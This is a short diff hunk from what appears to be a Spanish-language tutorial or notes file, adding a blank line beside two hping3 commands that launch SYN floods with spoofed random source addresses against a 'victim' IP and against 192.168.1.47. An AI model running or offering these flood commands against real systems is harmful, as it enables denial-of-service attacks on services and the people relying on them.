@@ -95,6 +95,7 @@ hping3 --rand-source -p 80  -S --flood [ip_victima] # IP de origen generada alea
 </b>
 
 <b>
+
 ```
 hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.47
 ```
